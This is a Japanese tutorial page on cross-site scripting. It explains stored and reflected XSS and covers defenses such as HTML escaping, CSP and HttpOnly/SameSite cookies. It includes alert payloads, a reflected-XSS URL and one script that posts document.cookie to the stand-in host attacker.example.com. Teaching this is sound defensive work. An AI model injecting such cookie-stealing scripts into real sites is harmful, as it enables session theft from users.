---
title: "XSS (Cross-Site Scripting)"
draft: false
weight: 999
---

XSS攻撃は、攻撃者が悪意あるスクリプトをユーザに実行させるものです。
攻撃対象のサイトにアクセスしたユーザの cookie 情報を漏洩させたり、Web ページを改ざんすることができます。

## 持続型 XSS（stored）

持続型 XSS は、攻撃用の JavaScript が攻撃対象のサイトに保存されているタイプの XSS です。
攻撃者の悪意ある入力がデータベースに保存され、他のユーザがサイトにアクセスした際に実行されます。

例えば、チャットアプリで攻撃者が次のように投稿するとします。

```html
<script>alert("Hacked!");</script>
```

エスケープなどの適切な処理をされていない場合、ユーザがチャットアプリにアクセスして攻撃者の投稿を表示すると、上記の script が実行されます。`alert` だけであれば問題は少ないかもしれませんが、以下のような script にすれば cookie を攻撃者に送信することができてしまいます。

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://attacker.example.com/steal-data", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("cookie=" + document.cookie);
</script>
```

## 反射型 XSS（reflected）

反射型 XSS は、攻撃用の JavaScript が攻撃対象のサイトに保存されていないタイプの XSS です。持続型 XSS と比べて影響範囲は限定的となります。

例として、攻撃者が偽サイトのリンクやメール、SNS の URL に次のようなリンクを仕込んでおく場合を考えます。

```html
https://victim.example.com/search?q=<script>alert('Hacked!');</script>
```

攻撃対象のサイトでパラメータを適切に処理していないと、script が実行されてしまう場合があります。
先程の例と同様、実行されるのが `alert` とは限らない点が問題です。

偽サイトの中に `iframe` で攻撃対象のサイトを埋め込んでおいてセッション ID を盗む例や、フォームの入力欄の XSS 脆弱性を利用して攻撃者に情報を送信するように改ざんしたフォームに書き換える方法などもあります。

## 対策

XSS 脆弱性が発生する主な要因は、HTML 生成時に特殊記号をエスケープする処理が抜けていることです。
根本的な対策としては、`<p>text</p>` の `text` や `<input name="foo" value="val">` の `val` のような要素内容や属性値内の特殊記号を、以下の表に示すようにもれなくエスケープする必要があります。

| 特殊記号 | エスケープ |
| -------- | ---------- |
| <        | `&lt;`     |
| >        | `&gt;`     |
| &        | `&amp;`    |
| "        | `&quot;`   |
| '        | `&#39;`    |

さらに、以下の対策を行うと良いです。

- Webサーバの設定でXSSフィルタを有効にするレスポンスヘッダを返す
  - Content Security Policy (CSP): サーバのレスポンスヘッダによって制御され、外部コンテンツの読み込みやスクリプトの実行などを制限するためのセキュリティポリシー
  - X-XSS-Protection: 古いブラウザでは実装が異なるか、またはサポートされていないことがあるため、現在は非推奨とされており、CSPが推奨される
- 入力値のサニタイズを行う（例：数字のみ、英字のみ、文字制限）
- Cookieの設定を工夫する
  - HttpOnly: JavaScriptでCookieを読めなくする設定
  - SameSite: 異なるドメインからのリクエストでCookieを読めなくする設定。制限の種類があるため、使用時には適切なものを選択する必要がある

## 参考

- 徳丸 浩、「体系的に学ぶ 安全なWebアプリケーションの作り方 第2版」
